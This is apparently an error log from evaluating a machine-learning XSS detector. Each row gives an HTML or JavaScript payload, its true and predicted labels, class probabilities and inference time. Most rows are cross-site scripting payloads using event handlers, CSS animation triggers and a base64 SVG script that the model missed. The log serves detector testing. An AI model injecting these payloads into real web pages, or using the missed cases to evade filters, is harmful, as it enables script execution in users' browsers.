payload,true_label,predicted_label,probabilities,inference_time_ms
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",1,0,"{'benign': 0.6261, 'malicious': 0.3739}",32.35950000000187
"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>",1,0,"{'benign': 0.5867, 'malicious': 0.4133}",30.809099999999034
"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",1,0,"{'benign': 0.6163, 'malicious': 0.3837}",26.124499999998108
"<ul draggable=""true"" ondragleave=""alert(1)"">test</ul>",1,0,"{'benign': 0.5251, 'malicious': 0.4749}",26.136999999998523
"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>",1,0,"{'benign': 0.6276, 'malicious': 0.3724}",32.56460000000061
"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",1,0,"{'benign': 0.5935, 'malicious': 0.4065}",40.211700000000405
"<listing onclick=""alert(1)"">test</listing>",1,0,"{'benign': 0.5117, 'malicious': 0.4883}",27.691100000001967
"<tr onkeydown=""alert(1)"" contenteditable>test</tr>",1,0,"{'benign': 0.578, 'malicious': 0.422}",32.9763000000014
"<hgroup onmouseover=""alert(1)"">test</hgroup>",1,0,"{'benign': 0.5625, 'malicious': 0.4375}",25.26600000000201
"<ul oncut=""alert(1)"" contenteditable>test</ul>",1,0,"{'benign': 0.5836, 'malicious': 0.4164}",25.27170000000112
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",1,0,"{'benign': 0.603, 'malicious': 0.397}",56.584100000002024
<dir onpointerup=alert(1)>XSS</dir>,1,0,"{'benign': 0.5619, 'malicious': 0.4381}",21.491799999999728
<li>Memory,0,1,"{'benign': 0.4293, 'malicious': 0.5707}",18.80199999999732
"<canvas draggable=""true"" ondragleave=""alert(1)"">test</canvas>",1,0,"{'benign': 0.5192, 'malicious': 0.4808}",30.489400000000444
"<multicol onmouseover=""alert(1)"">test</multicol>",1,0,"{'benign': 0.5868, 'malicious': 0.4132}",25.67330000000112
"<track draggable=""true"" ondragstart=""alert(1)"">test</track>",1,0,"{'benign': 0.5233, 'malicious': 0.4767}",25.104200000001242
"<details draggable=""true"" ondrag=""alert(1)"">test</details>",1,0,"{'benign': 0.5571, 'malicious': 0.4429}",25.520399999997778
"<noframes draggable=""true"" ondrag=""alert(1)"">test</noframes>",1,0,"{'benign': 0.5404, 'malicious': 0.4596}",28.372700000002027
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationend=""alert(1)""></canvas>",1,0,"{'benign': 0.5733, 'malicious': 0.4267}",34.727000000000174
<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,1,0,"{'benign': 0.5586, 'malicious': 0.4414}",31.672799999999057
<dt onpointerenter=alert(1)>XSS</dt>,1,0,"{'benign': 0.6307, 'malicious': 0.3693}",23.247200000000134
"<style>:target {color: red;}</style><nobr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nobr>",1,0,"{'benign': 0.6422, 'malicious': 0.3578}",40.37830000000042
<body onblur=alert(1) id=x><iframe id=x>,1,0,"{'benign': 0.5217, 'malicious': 0.4783}",25.431999999998567
"<h1 draggable=""true"" ondragstart=""alert(1)"">test</h1>",1,0,"{'benign': 0.5426, 'malicious': 0.4574}",25.406999999997737
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,1,0,"{'benign': 0.559, 'malicious': 0.441}",28.72560000000135
top[??al\x65rt??¢](1),1,0,"{'benign': 0.6574, 'malicious': 0.3426}",25.178900000000226
"<br onmouseenter=""alert(1)"">test</br>",1,0,"{'benign': 0.5346, 'malicious': 0.4654}",23.020999999999958
"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",1,0,"{'benign': 0.6492, 'malicious': 0.3508}",35.72759999999775
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,1,0,"{'benign': 0.5191, 'malicious': 0.4809}",25.494299999998304
"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",1,0,"{'benign': 0.5411, 'malicious': 0.4589}",25.63519999999997
<marquee onstart=alert(1)></marquee>,1,0,"{'benign': 0.5469, 'malicious': 0.4531}",27.13500000000124
"<th onbeforecut=""alert(1)"" contenteditable>test</th>",1,0,"{'benign': 0.5907, 'malicious': 0.4093}",24.964000000000652
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationstart=""alert(1)""></label>",1,0,"{'benign': 0.5662, 'malicious': 0.4338}",34.006399999999104
<tr onpointerenter=alert(1)>XSS</tr>,1,0,"{'benign': 0.6057, 'malicious': 0.3943}",24.12879999999973
"<s onkeyup=""alert(1)"" contenteditable>test</s>",1,0,"{'benign': 0.5747, 'malicious': 0.4253}",25.633300000002635
"<acronym onmouseup=""alert(1)"">test</acronym>",1,0,"{'benign': 0.5575, 'malicious': 0.4425}",24.485200000000873
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",1,0,"{'benign': 0.6058, 'malicious': 0.3942}",34.42649999999858
"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",1,0,"{'benign': 0.6427, 'malicious': 0.3573}",27.530699999999797
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationend=""alert(1)""></img>",1,0,"{'benign': 0.5706, 'malicious': 0.4294}",36.13890000000097
<cite onpointerleave=alert(1)>XSS</cite>,1,0,"{'benign': 0.6075, 'malicious': 0.3925}",23.26680000000181
"<style oncut=""alert(1)"" contenteditable>test</style>",1,0,"{'benign': 0.5784, 'malicious': 0.4216}",24.623000000001838
<textarea autofocus onfocusin=alert(1)>test</textarea>,1,0,"{'benign': 0.5657, 'malicious': 0.4343}",24.895900000000637
"        <span class=""commit"">",0,1,"{'benign': 0.4634, 'malicious': 0.5366}",29.05460000000204
<frame onpointerenter=alert(1)>XSS</frame>,1,0,"{'benign': 0.5876, 'malicious': 0.4124}",24.68730000000008
<custom tags onpointerout=alert(1)>XSS</custom tags>,1,0,"{'benign': 0.5588, 'malicious': 0.4412}",25.891200000000225
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",1,0,"{'benign': 0.5749, 'malicious': 0.4251}",34.55929999999796
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionend=alert(1)></nextid>",1,0,"{'benign': 0.6257, 'malicious': 0.3743}",33.15049999999786
"<nobr ondblclick=""alert(1)"">test</nobr>",1,0,"{'benign': 0.5812, 'malicious': 0.4188}",24.483400000001154
"<BR SIZE=""&{alert('')}"">",1,0,"{'benign': 0.534, 'malicious': 0.466}",25.36620000000056
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",1,0,"{'benign': 0.6064, 'malicious': 0.3936}",26.031100000000862
"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",1,0,"{'benign': 0.602, 'malicious': 0.398}",24.466700000001396
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",1,0,"{'benign': 0.6214, 'malicious': 0.3786}",25.19670000000218
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(1)""></button>",1,0,"{'benign': 0.5696, 'malicious': 0.4304}",36.499800000001414
<noscript id=x tabindex=1 onfocus=alert(1)></noscript>,1,0,"{'benign': 0.5634, 'malicious': 0.4366}",27.313599999999383
"<title ondblclick=""alert(1)"">test</title>",1,0,"{'benign': 0.5916, 'malicious': 0.4084}",27.322300000001576
"<td draggable=""true"" ondrag=""alert(1)"">test</td>",1,0,"{'benign': 0.5109, 'malicious': 0.4891}",25.12259999999955
"<center onmouseleave=""alert(1)"">test</center>",1,0,"{'benign': 0.6093, 'malicious': 0.3907}",23.835399999999396
<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>,1,0,"{'benign': 0.5262, 'malicious': 0.4738}",26.418599999999515
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,1,0,"{'benign': 0.5428, 'malicious': 0.4572}",25.685700000000367
<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>,1,0,"{'benign': 0.5047, 'malicious': 0.4953}",26.870100000000008
"<p draggable=""true"" ondragstart=""alert(1)"">test</p>",1,0,"{'benign': 0.5185, 'malicious': 0.4815}",26.9880000000029
"RC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""",1,0,"{'benign': 0.6342, 'malicious': 0.3658}",131.6215000000014
<hr onpointerenter=alert(1)>XSS</hr>,1,0,"{'benign': 0.6094, 'malicious': 0.3906}",23.03020000000089
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationend=""alert(1)""></slot>",1,0,"{'benign': 0.5735, 'malicious': 0.4265}",31.81889999999754
"<object ondblclick=""alert(1)"">test</object>",1,0,"{'benign': 0.5681, 'malicious': 0.4319}",28.433399999997278
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationend=""alert(1)""></applet>",1,0,"{'benign': 0.5895, 'malicious': 0.4105}",35.09990000000229
"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",1,0,"{'benign': 0.6474, 'malicious': 0.3526}",20.9243999999984
"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",1,0,"{'benign': 0.6162, 'malicious': 0.3838}",24.789999999999424
"<colgroup onmouseout=""alert(1)"">test</colgroup>",1,0,"{'benign': 0.6322, 'malicious': 0.3678}",25.753400000002813
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",1,0,"{'benign': 0.591, 'malicious': 0.409}",44.23519999999925
<image3 onpointerdown=alert(1)>XSS</image3>,1,0,"{'benign': 0.5802, 'malicious': 0.4198}",24.436399999999026
"<listing draggable=""true"" ondragenter=""alert(1)"">test</listing>",1,0,"{'benign': 0.5312, 'malicious': 0.4688}",28.689799999998655
"<cite onmouseover=""alert(1)"">test</cite>",1,0,"{'benign': 0.5326, 'malicious': 0.4674}",25.691800000000597
"<dd oncontextmenu=""alert(1)"">test</dd>",1,0,"{'benign': 0.5269, 'malicious': 0.4731}",23.85110000000168
"<style>:target {color: red;}</style><template id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></template>",1,0,"{'benign': 0.6445, 'malicious': 0.3555}",36.11670000000089
"<svg onmouseup=""alert(1)"">test</svg>",1,0,"{'benign': 0.5947, 'malicious': 0.4053}",28.30759999999799
<svg><dt onload=alert(1)></dt>,1,0,"{'benign': 0.6038, 'malicious': 0.3962}",25.23000000000053
"<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menuitem>",1,0,"{'benign': 0.5919, 'malicious': 0.4081}",42.832600000000554
"<thead onmouseenter=""alert(1)"">test</thead>",1,0,"{'benign': 0.6087, 'malicious': 0.3913}",26.358599999998233
<br onpointerover=alert(1)>XSS</br>,1,0,"{'benign': 0.5136, 'malicious': 0.4864}",23.06030000000092
"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>",1,0,"{'benign': 0.5994, 'malicious': 0.4006}",31.261300000000602
</div>,0,1,"{'benign': 0.4444, 'malicious': 0.5556}",19.748499999998614
<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>,1,0,"{'benign': 0.5239, 'malicious': 0.4761}",31.016300000000996
<svg><image href=1 onerror=alert(1)>,1,0,"{'benign': 0.5055, 'malicious': 0.4945}",24.340500000000986
<svg><template onload=alert(1)></template>,1,0,"{'benign': 0.5922, 'malicious': 0.4078}",22.780600000000817
document.write,1,0,"{'benign': 0.5332, 'malicious': 0.4668}",19.37059999999846
"<menuitem oncopy=""alert(1)"" contenteditable>test</menuitem>",1,0,"{'benign': 0.5115, 'malicious': 0.4885}",29.897600000001745
<picture onpointerdown=alert(1)>XSS</picture>,1,0,"{'benign': 0.5682, 'malicious': 0.4318}",22.908900000000898
 </div>,0,1,"{'benign': 0.4444, 'malicious': 0.5556}",19.522899999998344
<div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>,1,0,"{'benign': 0.5074, 'malicious': 0.4926}",29.94029999999981
"<sub draggable=""true"" ondragleave=""alert(1)"">test</sub>",1,0,"{'benign': 0.5718, 'malicious': 0.4282}",26.755800000000107
"<textarea draggable=""true"" ondragleave=""alert(1)"">test</textarea>",1,0,"{'benign': 0.5354, 'malicious': 0.4646}",28.02249999999873
"		<h3  id=""p-tb-label"">",0,1,"{'benign': 0.4955, 'malicious': 0.5045}",23.19750000000198
<listing onpointermove=alert(1)>XSS</listing>,1,0,"{'benign': 0.5325, 'malicious': 0.4675}",26.108400000001808
<b onpointerenter=alert(1)>XSS</b>,1,0,"{'benign': 0.5511, 'malicious': 0.4489}",22.99939999999978
"<label onmousemove=""alert(1)"">test</label>",1,0,"{'benign': 0.553, 'malicious': 0.447}",23.448800000000602
"<style draggable=""true"" ondragstart=""alert(1)"">test</style>",1,0,"{'benign': 0.5202, 'malicious': 0.4798}",28.64399999999989
<svg onpointerdown=alert(1)>XSS</svg>,1,0,"{'benign': 0.601, 'malicious': 0.399}",32.069000000003456
<img src/onerror=alert(1)>,1,0,"{'benign': 0.5717, 'malicious': 0.4283}",23.688400000001053
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",1,0,"{'benign': 0.5805, 'malicious': 0.4195}",51.17689999999797
<input type=checkbox id=x onfocus=alert(1)>,1,0,"{'benign': 0.5145, 'malicious': 0.4855}",31.110100000002916
"<h1 onmousedown=""alert(1)"">test</h1>",1,0,"{'benign': 0.5547, 'malicious': 0.4453}",23.474799999998908
<dir onpointerout=alert(1)>XSS</dir>,1,0,"{'benign': 0.5264, 'malicious': 0.4736}",23.440400000001915
"<hgroup onmousemove=""alert(1)"">test</hgroup>",1,0,"{'benign': 0.5769, 'malicious': 0.4231}",23.560700000000878
<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>,1,0,"{'benign': 0.5262, 'malicious': 0.4738}",29.80879999999786
<big onpointerup=alert(1)>XSS</big>,1,0,"{'benign': 0.6547, 'malicious': 0.3453}",24.17639999999821
"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=alert(1)></div>",1,0,"{'benign': 0.5963, 'malicious': 0.4037}",34.44849999999988
"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>",1,0,"{'benign': 0.5754, 'malicious': 0.4246}",26.361800000000102
"<button oncopy=""alert(1)"" contenteditable>test</button>",1,0,"{'benign': 0.5496, 'malicious': 0.4504}",23.68669999999895
"<template draggable=""true"" ondrag=""alert(1)"">test</template>",1,0,"{'benign': 0.5445, 'malicious': 0.4555}",25.201800000001384
<textarea onbeforecut=alert(1) autofocus>XSS</textarea>,1,0,"{'benign': 0.5868, 'malicious': 0.4132}",26.02059999999895
"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>",1,0,"{'benign': 0.6269, 'malicious': 0.3731}",35.61949999999925
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("""")>",1,0,"{'benign': 0.5685, 'malicious': 0.4315}",30.56829999999877
"<em onbeforecopy=""alert(1)"" contenteditable>test</em>",1,0,"{'benign': 0.6171, 'malicious': 0.3829}",26.27209999999991
<canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>,1,0,"{'benign': 0.5379, 'malicious': 0.4621}",28.676300000000765
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",1,0,"{'benign': 0.5894, 'malicious': 0.4106}",40.155200000000946
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",1,0,"{'benign': 0.574, 'malicious': 0.426}",28.156700000000257
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,1,0,"{'benign': 0.574, 'malicious': 0.426}",28.019999999997935
"<i oncopy=""alert(1)"" contenteditable>test</i>",1,0,"{'benign': 0.5673, 'malicious': 0.4327}",29.42339999999888
<xmp onpointermove=alert(1)>XSS</xmp>,1,0,"{'benign': 0.5743, 'malicious': 0.4257}",23.54790000000051
"<br onpaste=""alert(1)"" contenteditable>test</br>",1,0,"{'benign': 0.5669, 'malicious': 0.4331}",25.236699999997114
<discard onpointerup=alert(1)>XSS</discard>,1,0,"{'benign': 0.5968, 'malicious': 0.4032}",28.645699999998442
<svg><video onload=alert(1)></video>,1,0,"{'benign': 0.6051, 'malicious': 0.3949}",23.21320000000071
"<option onmousedown=""alert(1)"">test</option>",1,0,"{'benign': 0.5345, 'malicious': 0.4655}",25.040799999999308
<dd onpointerdown=alert(1)>XSS</dd>,1,0,"{'benign': 0.5365, 'malicious': 0.4635}",23.623900000000475
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",1,0,"{'benign': 0.5379, 'malicious': 0.4621}",30.165100000001388
"<noframes onbeforecut=""alert(1)"" contenteditable>test</noframes>",1,0,"{'benign': 0.6234, 'malicious': 0.3766}",26.560200000002254
"\<a onmouseover=""alert(document.cookie)""\>xxs link\</a\>",1,0,"{'benign': 0.575, 'malicious': 0.425}",26.112000000001245
document.write(sadfsa),1,0,"{'benign': 0.5219, 'malicious': 0.4781}",22.50439999999898
"<style>@keyframes slidein {}</style><noframes style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noframes>",1,0,"{'benign': 0.5988, 'malicious': 0.4012}",52.06270000000046
"<tfoot onpaste=""alert(1)"" contenteditable>test</tfoot>",1,0,"{'benign': 0.5881, 'malicious': 0.4119}",30.834399999999818
"<style>:target {color: red;}</style><picture id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></picture>",1,0,"{'benign': 0.6293, 'malicious': 0.3707}",35.59670000000281
"<blink onkeyup=""alert(1)"" contenteditable>test</blink>",1,0,"{'benign': 0.5852, 'malicious': 0.4148}",27.225600000001293
<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>,1,0,"{'benign': 0.5386, 'malicious': 0.4614}",31.000899999998666
javas<!-- -->cript:alert(''),1,0,"{'benign': 0.5405, 'malicious': 0.4595}",23.41870000000057
<animatetransform onpointerup=alert(1)>XSS</animatetransform>,1,0,"{'benign': 0.6118, 'malicious': 0.3882}",30.840600000001217
"<embed draggable=""true"" ondragleave=""alert(1)"">test</embed>",1,0,"{'benign': 0.5485, 'malicious': 0.4515}",32.24050000000034
<legend onpointerover=alert(1)>XSS</legend>,1,0,"{'benign': 0.5694, 'malicious': 0.4306}",24.467300000001302
